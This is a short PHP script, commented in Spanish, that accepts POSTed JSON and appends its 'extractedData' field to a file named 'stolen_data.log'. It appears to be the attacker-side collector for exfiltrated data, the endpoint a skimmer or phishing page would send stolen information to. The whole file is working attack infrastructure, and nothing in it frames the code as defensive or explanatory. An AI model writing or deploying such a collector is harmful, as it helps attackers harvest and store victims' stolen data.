<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    $extractedData = $data['extractedData'] ?? 'Datos no especificados';
    
    // Escribe los datos en un archivo (ejemplo: stolen_data.log)
    $file = 'stolen_data.log';  // Nombre del archivo donde se guardan los datos
    file_put_contents($file, $extractedData . PHP_EOL, FILE_APPEND);  // Añade los datos al final del archivo
    
    echo 'Datos recibidos';  // Respuesta simple
}
?>
